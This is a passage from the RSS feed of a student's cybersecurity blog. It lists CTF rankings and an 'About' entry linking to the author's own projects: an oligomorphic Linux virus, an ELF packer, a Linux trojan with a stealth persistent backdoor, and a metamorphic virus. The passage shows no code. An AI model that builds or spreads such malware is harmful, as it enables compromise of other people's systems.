&lt;li&gt;Team: APT42&lt;/li&gt;
&lt;li&gt;Ranking: #4/13&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;saarctf-2022---attackdefense&#34;&gt;SaarCTF 2022 - Attack/Defense&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #26/88&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hackthebox-uni-ctf-2021-finals---jeopardyfullpwn&#34;&gt;HackTheBox Uni CTF 2021 Finals - Jeopardy/FullPwn&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #3/25&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2021&#34;&gt;2021&lt;/h1&gt;
&lt;h3 id=&#34;hackthebox-uni-ctf-2021-qualifiers---jeopardyfullpwn-ctf-open-for-every-university-in-the-world&#34;&gt;HackTheBox Uni CTF 2021 Qualifiers - Jeopardy/FullPwn CTF open for every university in the world&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #2/576&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;bambictf-6---beginner-oriented-attackdefense-ctf&#34;&gt;Bambictf #6 - Beginner-oriented Attack/Defense CTF&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Team: APTduoquadra&lt;/li&gt;
&lt;li&gt;Ranking: #34/60&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>About</title>
      <link>https://alagroy-42.github.io/about/</link>
      <pubDate>Tue, 14 Jun 2022 14:23:54 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/about/</guid>
      <description>$&amp;gt; whoami My name is Adrien and I am a computer science student mainly interested in cybersecurity. I mainly enjoy everything related to malware whether it is malware development or analysis, I also play CTFs. I will use this site to post writeups and articles about my findings on my cyber world journey.
$&amp;gt; ls -l ~/Projects Pestilence: An oligomorphic Linux virus implementing different obfuscation techniques. Woody-woodpacker: A simple ELF packer that can encrypt a given binary and insert a decryption routine.</description>
      <content>&lt;h2 id=&#34;-whoami&#34;&gt;$&amp;gt; whoami&lt;/h2&gt;
&lt;p&gt;My name is Adrien and I am a computer science student mainly interested in cybersecurity. I mainly enjoy everything related to malware whether it is malware development or analysis, I also play CTFs. I will use this site to post writeups and articles about my findings on my cyber world journey.&lt;/p&gt;
&lt;h2 id=&#34;-ls--l-projects&#34;&gt;$&amp;gt; ls -l ~/Projects&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/alagroy-42/Pestilence&#34;&gt;Pestilence&lt;/a&gt;: An oligomorphic Linux virus implementing different obfuscation techniques.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/alagroy-42/woody-woodpacker&#34;&gt;Woody-woodpacker&lt;/a&gt;: A simple ELF packer that can encrypt a given binary and insert a decryption routine.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/alagroy-42/Durex&#34;&gt;Durex&lt;/a&gt;: A simple Linux trojan installing a persisting and stealth backdoor.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/alagroy-42/42sh&#34;&gt;42sh&lt;/a&gt;: A quite complete shell coded in C&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/alagroy-42/Covid-24&#34;&gt;Covid-24&lt;/a&gt;: WIP! A fully-metamorphic virus using a complex metamorphic engine.&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
